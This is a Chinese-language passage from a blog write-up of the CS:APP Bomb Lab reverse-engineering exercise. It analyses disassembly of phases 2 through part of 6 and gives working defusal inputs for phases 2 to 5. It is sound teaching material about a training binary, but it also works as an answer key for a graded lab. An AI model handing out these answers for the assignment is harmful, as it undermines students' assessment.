<p>接下来看第6、7、8行，它将<code>rsp</code>中存放的值与1进行比较，如果相等则跳过第8行的引爆代码，说明我们需要输入的第一个数为1 。再看跳转到的位置（19、20行）将<code>rsp+0x4</code>与<code>rsp+0x18</code>的值分别存放到了<code>rbx</code>与<code>rbp</code>。下一行又进行了一次跳转，来到了第10行，第10行将<code>rbx</code>的地址减4中存放的内容复制到了<code>eax</code>中，<code>rbx</code>的地址减4也就意味着与<code>rsp</code>相等，它的值也就是第一个读入的值。下一行将<code>eax</code>的值乘二，接下来将乘二后的值与<code>rbx</code>也就是第二个值进行比较，如果相同则跳过引爆代码。上面这一系列操作总结起来就是如果第二个值是第一个值的两倍则不引爆。</p>
<p>再往下就是把<code>rbx</code>的值加上4，因为一个<code>int</code>占4个字节，也就是把<code>rbx</code>指向了下一个读入的值。下一步将<code>rbx</code>与<code>rbp</code>的值进行比较，回想<code>rbp</code>的值为的<code>rsp+0x18</code>也就是 <code>rsp+24</code>，指向6个<code>int</code>值之后的位置，所以与它进行比较就是判断是否到达临界条件。如果没有到达临界条件，则跳到上一段中比较的部分继承进行。看到这里，我们已经可以判断出<code>phase_2</code>的要求是读入的6个数第一个数必为1，而后面的数字都是前面一个数字的两倍。</p>
<p>所以阶段2的答案为<code>1 2 4 8 16 32</code>.</p>
<h4 id="阶段三"><a href="#阶段三" class="headerlink" title="阶段三"></a>阶段三</h4><p>阶段三的代码比较长，我们分开来看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)</span><br><span class="line">  400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt;</span><br><span class="line">  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)</span><br></pre></td></tr></table></figure>
<p>第3、4两行将<code>rsp+0xc</code>与<code>rsp+0x8</code>的值分别给<code>rcx</code>与<code>rdx</code>，下一行将一个地址值复制给了<code>esi</code>，接着将<code>eax</code>置为0，下一步调用了库函数<code>sscanf</code>，我们想到<code>sscanf</code>中的参数中需要一个格式化字符串，那么<code>esi</code>中的这个地址值就很有可能存放了这个字符串，我们同样使用<code>gdb</code>在运行时查看这个字符串：</p>
<p><img src="/images/bomblab4.png" alt=""></p>
<p>可以看到这就是格式化字符串，读入的是两个整型值。这两个值存放在哪里呢？我们想到之前把<code>rsp+0xc</code>与<code>rsp+0x8</code>的值分别给<code>rcx</code>与<code>rdx</code>，这是两个地址值，我们可以用之前的方法验证栈中存放的确实是我们读入的这两个值。</p>
<p>下面第8行将<code>eax</code>与1进行比较，<code>eax</code>一般用于存放函数返回值，而<code>sscanf</code> 的返回值是成功读入的数值个数，也就是说这几行将成功读入的个数与1进行比较，如果大于1则跳过引爆的代码。</p>
<p>下面第11行将<code>rsp+0x8</code>中存放的值与<code>0x7</code>进行比较，如果大于<code>0x7</code>则跳到<code>400fad</code>的位置，我们看这个地址的指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>引爆炸弹。</p>
<p>下面的两行比较关键：第13行将<code>rsp+0x8</code>中存放的值复制入<code>eax</code>，第14行进行一个跳转，跳转到的地址为<code>0x402470(,%rax,8)</code>，这就是一个典型的<code>switch</code>语句的实现：直接跳转到索引*位移的指令位置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x &#x3D; 0</span><br><span class="line">400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax</span><br><span class="line">400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">x &#x3D; 2</span><br><span class="line">400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax</span><br><span class="line">400f88:	eb 34                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">x &#x3D; 3</span><br><span class="line">400f8a:	b8 00 01 00 00       	mov    $0x100,%eax</span><br><span class="line">400f8f:	eb 2d                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">x &#x3D; 4</span><br><span class="line">400f91:	b8 85 01 00 00       	mov    $0x185,%eax</span><br><span class="line">400f96:	eb 26                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">x &#x3D; 5</span><br><span class="line">400f98:	b8 ce 00 00 00       	mov    $0xce,%eax</span><br><span class="line">400f9d:	eb 1f                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">x &#x3D; 6</span><br><span class="line">400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax</span><br><span class="line">400fa4:	eb 18                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">x &#x3D; 7</span><br><span class="line">400fa6:	b8 47 01 00 00       	mov    $0x147,%eax</span><br><span class="line">400fab:	eb 11                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line"></span><br><span class="line">400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">400fb2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">400fb7:	eb 05                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">x &#x3D; 1</span><br><span class="line">400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax</span><br><span class="line">400fc2:	74 05                	je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line"></span><br><span class="line">400fc4:	e8 71 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">400fc9:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">400fcd:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>上面的代码已经加了注释，假设读入的第一个数为x，看到所有分支最后都跳转到了<code>400fbe</code>这行判断中，将<code>eax</code>中的值与<code>rsp+0xc</code>也就是我们读入的第二个数进行判断，如果相等的话跳过引爆代码。</p>
<p>而每个分支都将一个数复制到了<code>eax</code>中，也就是说我们只要根据不同的第一个参数的值读入对应的第二个参数就可以了，所以我们可以随意选择一个x值，这里我选择<code>x=1</code>，对应的第二个参数为<code>0x137</code>换成十进制是311，所以第3阶段的（一个）答案为：</p>
<p><code>1 311</code></p>
<h4 id="阶段四"><a href="#阶段四" class="headerlink" title="阶段四"></a>阶段四</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  40101f:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401024:	e8 c7 fb ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)</span><br><span class="line">  401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line">  401035:	e8 00 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx</span><br><span class="line">  40103f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi</span><br><span class="line">  401048:	e8 81 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  40104d:	85 c0                	test   %eax,%eax</span><br><span class="line">  40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt;</span><br></pre></td></tr></table></figure>
<p>前面的代码比较熟悉，同样是调用了<code>sscanf</code>函数，我们查看格式字符串：</p>
<p><img src="/images/bomblab5.png" alt=""></p>
<p>也是读入两个参数存放在<code>rcx</code>与<code>rdx</code>中。</p>
<p>同样对读入参数的个数进行了判断，要求成功读入参数的个数等于两个，第11、12行要求输入的第一个参数小于<code>0xe</code>。</p>
<p>接下来把0xe赋给<code>edx</code>、0x0赋给<code>esi</code>，<code>rsp+0x8</code>的值赋给<code>edi</code>。接下来调用了<code>func4</code>函数。</p>
<p>在去查看<code>func4</code>函数的代码之前，我们先查看函数返回后的代码，了解我们需要的结果。第17、18行测试了<code>eax</code>的值如果不为0，就跳转到引爆代码。</p>
<p>所以我们的目标是返回时<code>eax</code>的值为0.下面进入<code>func4</code>函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  400fce:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400fd2:	89 d0                	mov    %edx,%eax</span><br><span class="line">  400fd4:	29 f0                	sub    %esi,%eax</span><br><span class="line">  400fd6:	89 c1                	mov    %eax,%ecx</span><br><span class="line">  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx</span><br><span class="line">  400fdb:	01 c8                	add    %ecx,%eax</span><br><span class="line">  400fdd:	d1 f8                	sar    %eax</span><br><span class="line">  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx</span><br><span class="line">  400fe2:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">  400fe4:	7e 0c                	jle    400ff2 &lt;func4+0x24&gt;</span><br><span class="line">  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx</span><br><span class="line">  400fe9:	e8 e0 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  400fee:	01 c0                	add    %eax,%eax</span><br><span class="line">  400ff0:	eb 15                	jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400ff7:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">  400ff9:	7d 0c                	jge    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi</span><br><span class="line">  400ffe:	e8 cb ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401007:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  40100b:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>这段代码之中我们调用了<code>func4</code>，这是一个递归的过程，像之间那样直接分析比较困难，这里我们就将这个代码逆向为C语言再来分析，下面是逆向出的C语言代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> b = (a1 - a2) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">int</span> result = ((a1-a2) + b) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    b = result + a2;</span><br><span class="line">    <span class="keyword">if</span>(b == x) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(b &lt; x) &#123;</span><br><span class="line">        result = fun(a1, b + <span class="number">1</span>, x);</span><br><span class="line">        <span class="keyword">return</span> result * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        result = fun(b - <span class="number">1</span>, a2, x);</span><br><span class="line">        <span class="keyword">return</span> result * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>a1`</code>a2<code>初始值分别为之前的</code>0xe<code>与</code>0x0`。我们可以直接写个测试程序来跑出能返回0的输入值：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xe</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(fun(<span class="number">0xe</span>,<span class="number">0</span>,i) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,i) ;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得出允许的值有<code>0 1 3 7</code>.</p>
<p>回到<code>phase_4</code>的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)</span><br><span class="line">401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">401058:	e8 dd 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">40105d:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">401061:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>第1、2行将输入的第二个参数与0进行比较，如果不为0就引爆炸弹。所以输入的第二个参数必为0。</p>
<p>综上我们得出（一个）答案为：</p>
<p><code>0 0</code></p>
<h4 id="阶段五"><a href="#阶段五" class="headerlink" title="阶段五"></a>阶段五</h4><p>后面的阶段难度开始加大，我们分部分进行分析：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:	53                   	push   %rbx</span><br><span class="line">  401063:	48 83 ec 20          	sub    $0x20,%rsp</span><br><span class="line">  401067:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  401071:	00 00</span><br><span class="line">  401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)</span><br></pre></td></tr></table></figure>
<p>第4行把输入的地址<code>rdi</code>给<code>rbx</code>，第5、7行则是在栈中压入了一个哨兵变量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401078:	31 c0                	xor    %eax,%eax</span><br><span class="line">40107a:	e8 9c 02 00 00       	callq  40131b &lt;string_length&gt;</span><br><span class="line">40107f:	83 f8 06             	cmp    $0x6,%eax</span><br><span class="line">401082:	74 4e                	je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">401084:	e8 b1 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>第1行清空了<code>eax</code>，第2行中调用了<code>string_length</code>，我们想到之前的把输入放入<code>rbx</code>这个动作，可以推测这个函数是为了统计输入字符的个数，并存放在了<code>eax</code>中。</p>
<p>下面将<code>eax</code>的值与<code>0x6</code>进行比较，等于则进行跳转避免引爆炸弹。我们进入跳转到的位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4010d2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">4010d7:	eb b2                	jmp    40108b &lt;phase_5+0x29&gt;</span><br></pre></td></tr></table></figure>
<p>把<code>eax</code>置为0后进行跳转。</p>
<p>继续进入跳转到的位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx</span><br><span class="line"> 40108f:	88 0c 24             	mov    %cl,(%rsp)</span><br><span class="line"> 401092:	48 8b 14 24          	mov    (%rsp),%rdx</span><br><span class="line"> 401096:	83 e2 0f             	and    $0xf,%edx</span><br><span class="line"> 401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx</span><br><span class="line"> 4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line"> 4010a4:	48 83 c0 01          	add    $0x1,%rax</span><br><span class="line"> 4010a8:	48 83 f8 06          	cmp    $0x6,%rax</span><br><span class="line"> 4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;</span><br></pre></td></tr></table></figure>
<p>第1行中<code>movzbl</code>命令将从<code>rbx</code>（输入）开始的<code>rax</code>位置的一个字节赋给<code>ecx</code>的低16位。</p>
<p>接下来的两行先把<code>cl</code>中的值（上一步得到）复制到<code>rsp</code>处，再将<code>rsp</code>中的值复制到<code>rdx</code>中，第4行使用掩码<code>0xf</code>取<code>edx</code>的低4位。到这里我们总结一下上面的操作：取读入的字符串中<code>rax</code>位置处的字符，再取它的低4位放在<code>edx</code>中。</p>
<p>下面第5行中，将地址<code>0x4024b0+rdx</code>中的一个字节放入<code>edx</code>的低16位中。第6行将这16位复制到了<code>rsp+0x10+rax</code>的位置中。</p>
<p>接下来把<code>rax</code>加1，我们从前面可以看出来这个<code>rax</code>起的是一个索引的作用。第 8行与6进行比较，如果不等于6则跳到第1行重复这个过程。</p>
<p>在这段之中，循环一共进行了6次，分别读取了输入的6个字符，记录这个6个字符的低6位作为索引<code>rdx</code>，从<code>0x4024b0+rdx</code>的位置复制一个字节到<code>rsp+0x10</code>开始的6字节中。结束之后，<code>rsp+0x10</code>开始存放了6个字符。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)</span><br></pre></td></tr></table></figure>
<p>接下来一行在<code>rsp+0x16</code>的位置也就是6个字符之后置上一个<code>0x0</code>也就是终止符<code>\0</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi</span><br><span class="line">4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">4010bd:	e8 76 02 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">4010c2:	85 c0                	test   %eax,%eax</span><br><span class="line">4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">4010c6:	e8 6f 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>接下来将<code>0x40245e</code>这个地址赋给<code>esi</code>，把<code>rsp+0x10</code>这个地址赋给<code>rdi</code>，接下来调用<code>strings_not_equal</code>这个函数，之前的经验告诉我们<code>esi</code>与<code>rdi</code>就是要比较的两个字符串的首地址。如果两个字符串不相同就引爆炸弹。</p>
<p>我们先看<code>0x40245e</code>位置的字符串：</p>
<p><img src="/images/bomblab6.png" alt=""></p>
<p>这就是我们应该构造并存放在<code>rsp+0x10</code>处的字符串。</p>
<p>接下来再查看我们复制到<code>rsp</code>中的字符来源也就是<code>0x4024b0</code>开始的字符：</p>
<p><img src="/images/bomblab7.png" alt=""></p>
<p>可以看到我们需要的字符<code>flyers</code>的索引分别为<code>9 15 14 5 6 7</code>。这个索引就是我们输入的字符的低4位，那我们只要找到低4位分别是以上数值的字符就可以了。</p>
<p>所以阶段5的（一个）答案为：</p>
<p><code>ionefg</code></p>
<h4 id="阶段六"><a href="#阶段六" class="headerlink" title="阶段六"></a>阶段六</h4><p>阶段六可以说是最复杂的一个阶段，同样一步步分析：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:	41 56                	push   %r14</span><br><span class="line">  4010f6:	41 55                	push   %r13</span><br><span class="line">  4010f8:	41 54                	push   %r12</span><br><span class="line">  4010fa:	55                   	push   %rbp</span><br><span class="line">  4010fb:	53                   	push   %rbx</span><br><span class="line">  4010fc:	48 83 ec 50          	sub    $0x50,%rsp</span><br><span class="line">  401100:	49 89 e5             	mov    %rsp,%r13</span><br><span class="line">  401103:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  401106:	e8 51 03 00 00       	callq  40145c &lt;read_six_numbers&gt;</span><br></pre></td></tr></table></figure>
<p>读入6个数字，存放位置还是栈中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40110b:	49 89 e6             	mov    %rsp,%r14</span><br><span class="line">40110e:	41 bc 00 00 00 00    	mov    $0x0,%r12d</span><br><span class="line">401114:	4c 89 ed             	mov    %r13,%rbp</span><br><span class="line">401117:	41 8b 45 00          	mov    0x0(%r13),%eax</span><br><span class="line">40111b:	83 e8 01             	sub    $0x1,%eax</span><br><span class="line">40111e:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">401121:	76 05                	jbe    401128 &lt;phase_6+0x34&gt;</span><br><span class="line">401123:	e8 12 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401128:	41 83 c4 01          	add    $0x1,%r12d</span><br><span class="line">40112c:	41 83 fc 06          	cmp    $0x6,%r12d</span><br><span class="line">401130:	74 21                	je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line">401132:	44 89 e3             	mov    %r12d,%ebx</span><br><span class="line">401135:	48 63 c3             	movslq %ebx,%rax</span><br><span class="line">401138:	8b 04 84             	mov    (%rsp,%rax,4),%eax</span><br><span class="line">40113b:	39 45 00             	cmp    %eax,0x0(%rbp)</span><br><span class="line">40113e:	75 05                	jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line">401140:	e8 f5 02 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401145:	83 c3 01             	add    $0x1,%ebx</span><br><span class="line">401148:	83 fb 05             	cmp    $0x5,%ebx</span><br><span class="line">40114b:	7e e8                	jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">40114d:	49 83 c5 04          	add    $0x4,%r13</span><br><span class="line">401151:	eb c1                	jmp    401114 &lt;phase_6+0x20&gt;</span><br></pre></td></tr></table></figure>
<p>前面是一系列的赋值操作，第5行将<code>eax</code>减1，<code>eax</code>中的值是<code>rsp</code>位置存放的值。第6、7两行将减一以后的值与5进行比较，小于等于5则跳过引爆代码。也就是说<code>rsp</code>中存放的第一个数必须小于等于6.</p>
<p>之前将<code>r12d</code>置为0，第9行中将<code>r12d</code>的值增加1，下一行与6进行比较，如果相等则跳入下一个阶段。</p>
<p>第12行中把<code>r12d</code>中的值复制给了<code>ebx</code>，下一步又赋给了<code>rax</code>，接下来的一行<code>mov</code>将<code>rsp+rax*4</code>中的值（也就是第rax+1个读入的<code>int</code>值）给了<code>eax</code>。</p>
<p>下一步将<code>eax</code>中的值与<code>rbp</code>地址指向的值进行比较，如果不相同则跳过引爆代码。说明这两个值需要不同，再接下来将<code>ebx</code>中的值加1，再与5进行比较，如果小于等于5则跳到第13行中，更新<code>rax</code>的值，再去从栈中取下一个新的<code>int</code>值和<code>rbp</code>中的进行比较。到这里我们可以看出，从13行到20行相当于一个内循环，从<code>r12d</code>开始，到5结束，不断地取栈中的值与<code>rbp</code>的值比较，也就是要求<code>rbp</code>之后的值需要与<code>rbp</code>不同。</p>
<p>第21、22行则是外循环，它更新了<code>r13</code>的值，令<code>r13</code>指向下一个<code>int</code>值。跳到第3行用<code>r13</code>的值更新<code>rbp</code>的值，也就是把比较的对象向后移一个。同样要求该值小于等于5。后面再进行内循环比较之后的值。</p>
<p>这里我们就可以明白这段代码的作用：限制读入的6个数必须小于等于6并且互不相等。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401153:	48 8d 74 24 18       	lea    0x18(%rsp),%rsi</span><br><span class="line">401158:	4c 89 f0             	mov    %r14,%rax</span><br><span class="line">40115b:	b9 07 00 00 00       	mov    $0x7,%ecx</span><br><span class="line">401160:	89 ca                	mov    %ecx,%edx</span><br><span class="line">401162:	2b 10                	sub    (%rax),%edx</span><br><span class="line">401164:	89 10                	mov    %edx,(%rax)</span><br><span class="line">401166:	48 83 c0 04          	add    $0x4,%rax</span><br><span class="line">40116a:	48 39 f0             	cmp    %rsi,%rax</span><br><span class="line">40116d:	75 f1                	jne    401160 &lt;phase_6+0x6c&gt;</span><br></pre></td></tr></table></figure>
<p>第1行中将<code>rsp+0x18</code>的值赋给<code>rsi</code>。</p>
<p>第2行将<code>r14</code>的值赋给<code>rax</code>，<code>r14</code>的值是之前保存的<code>rsp</code>。</p>
<p>第3行将0x7赋给<code>ecx</code>，第4行又将<code>ecx</code>复制给<code>edx</code>。</p>
<p>下一步将<code>edx</code>减去<code>rax</code>存放的地址指向的值，接下来又将<code>edx</code>的值赋回<code>rax</code>存放的地址指向的值。</p>
<p>第7行将<code>rax</code>的值加4，也就是指向了下一个<code>int</code>值，接着与之前设定的<code>rsi</code>进行的比较，如果不相等则重复这个过程。<code>rsi</code>实际上指向的是6个<code>int</code>值之后的位置，作为一个标记使用。</p>
<p>这段代码总结起来就是将栈中的6个值（假设为x）变为7-x。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40116f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">401174:	eb 21                	jmp    401197 &lt;phase_6+0xa3&gt;</span><br><span class="line">401176:	48 8b 52 08          	mov    0x8(%rdx),%rdx</span><br><span class="line">40117a:	83 c0 01             	add    $0x1,%eax</span><br><span class="line">40117d:	39 c8                	cmp    %ecx,%eax</span><br><span class="line">40117f:	75 f5                	jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">401181:	eb 05                	jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line"></span><br><span class="line">401183:	ba d0 32 60 00       	mov    $0x6032d0,%edx</span><br><span class="line">401188:	48 89 54 74 20       	mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">40118d:	48 83 c6 04          	add    $0x4,%rsi</span><br><span class="line">401191:	48 83 fe 18          	cmp    $0x18,%rsi</span><br><span class="line">401195:	74 14                	je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line">401197:	8b 0c 34             	mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">40119a:	83 f9 01             	cmp    $0x1,%ecx</span><br><span class="line">40119d:	7e e4                	jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line"></span><br><span class="line">40119f:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">4011a4:	ba d0 32 60 00       	mov    $0x6032d0,%edx</span><br><span class="line">4011a9:	eb cb                	jmp    401176 &lt;phase_6+0x82&gt;</span><br></pre></td></tr></table></figure>
<p>进入下一段代码，一开始先将<code>esi</code>归零，然后跳到第14行处执行。</p>
<p>第14行中从<code>rsp+rsi</code>的位置（也就是栈中我们读入的位置）取出一个数赋给<code>ecx</code>，接下来对取出的这个值进行判断，如果它小于等于1则跳到第9行处。</p>
<p>我们在这里假设这个数确实小于等于1。到第9行，将一个地址值赋给了<code>edx</code>，接下来将<code>edx</code>的值赋给了<code>rsp+2*rsi+0x20</code>的地址指向的值，这里我们可以知道<code>rsi</code>起到的是索引的作用，下面一行将<code>rsi</code>增加4，说明从<code>rsp+0x20</code>开始存放8个字节的数据。再将<code>rsi</code>的值与<code>0x18</code>作比较，说明整个过程要进行6次。接下来又到了第14行将下一个<code>int</code>值给<code>rcx</code>。</p>
<p>那么如果<code>rcx</code>的值不小于等于1，继续往下走，第18行将<code>0x1</code>赋给<code>eax</code>，19行将<code>0x6032d0</code>这个地址赋给<code>edx</code>，接下来跳转到了第3行。第3-6行的代码是一起的，也是理解这个过程的关键。</p>
<p>首先第3行的命令，把<code>edx+0x8</code>地址指向的值赋给了<code>edx</code>，这步操作一开始比较难以理解，我们需要先看看<code>edx</code>的初始状态是什么样的，使用<code>gdb</code>在运行时查看内存：</p>
<p><img src="/images/bomblab8.png" alt=""></p>
<p>我们可以从这个信息中看出，其实它就是一个链表的结构，首先名字就是<code>node</code>给了提示，再者每一个<code>node</code>中偏移8个字节中储存的都是下一个节点的地址，那么前面8个字节自然就是节点储存的数据。</p>
<p>我们再回过头来看第3行的代码，就不难理解这个操作就是我们常用的<code>p = p -&gt; next</code>，也就是指向下一个节点。</p>
<p>第4行把<code>eax</code>增1，再将<code>eax</code>与<code>ecx</code>进行比较，如果不等就再跳到第3步指向链表下一个节点，那么可以看出这4行代码的作用就是从<code>edx</code>这个初始位置开始向后移动<code>ecx-1</code>次，第7行跳过了第9行，把<code>edx</code>赋给了<code>rsp+0x20</code>开始的第<code>rsi</code>个8字节的位置。如果<code>rsi</code>达到<code>0x18</code>则跳出这部分代码。</p>
<p>我们整理一下这个过程，其实就是依次从栈中读取存放的6个数放入<code>rcx</code>，再根据<code>rcx</code>的值找到链表中对应的节点，把节点的地址放入<code>rsp+0x20</code>开始的对应位置中。</p>
